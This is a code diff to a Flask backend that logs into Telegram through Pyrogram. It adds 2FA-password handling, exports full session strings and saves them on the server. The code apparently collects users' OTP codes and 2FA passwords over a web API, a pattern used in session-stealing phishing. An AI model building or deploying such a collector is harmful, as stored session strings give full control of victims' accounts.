@@ -4,7 +4,7 @@ import traceback
 from flask import Flask, request, jsonify, send_file
 from flask_cors import CORS
 from pyrogram import Client
-from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired
+from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired, PasswordHashInvalid
 
 app = Flask(__name__)
 CORS(app)
@@ -60,6 +60,7 @@ def verify_code():
     data = request.json
     phone = data.get('phone')
     code = data.get('code')
+    password = data.get('password') # 2FA পাসওয়ার্ড রিসিভ করার জন্য
     
     if not phone or not code:
         return jsonify({"status": "error", "message": "Phone and Code are required"}), 400
@@ -75,7 +76,17 @@ def verify_code():
         async def verify_main():
             client = Client(session_name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
             await client.connect()
-            await client.sign_in(phone, phone_code_hash, code)
+            
+            try:
+                await client.sign_in(phone, phone_code_hash, code)
+            except SessionPasswordNeeded:
+                if not password:
+                    await client.disconnect()
+                    return {"status": "2fa_required"}
+                
+                # 2FA পাসওয়ার্ড চেক করা
+                await client.check_password(password)
+            
             session_string = await client.export_session_string()
             
             os.makedirs("sessions", exist_ok=True)
@@ -84,20 +95,23 @@ def verify_code():
                 f.write(session_string)
                 
             await client.disconnect()
+            return {"status": "success"}
 
-        asyncio.run(verify_main())
-        del temp_hashes[phone]
+        res = asyncio.run(verify_main())
         
+        if res and res.get("status") == "2fa_required":
+            return jsonify({"status": "2fa_required", "message": "2FA Password required"})
+            
+        del temp_hashes[phone]
         return jsonify({"status": "success", "message": "Session generated successfully!"})
         
     except PhoneCodeInvalid:
         return jsonify({"status": "error", "message": "Invalid OTP code!"}), 400
     except PhoneCodeExpired:
         return jsonify({"status": "error", "message": "OTP code has expired!"}), 400
-    except SessionPasswordNeeded:
-        return jsonify({"status": "success", "message": "2FA Password required"})
+    except PasswordHashInvalid:
+        return jsonify({"status": "error", "message": "Incorrect 2FA Password!"}), 400
     except Exception as e:
-        # এটি রেলওয়ে লগে আসল এররটি প্রিন্ট করবে
         print("VERIFY ERROR DETAILS:", traceback.format_exc())
         return jsonify({"status": "error", "message": str(e)}), 400
 
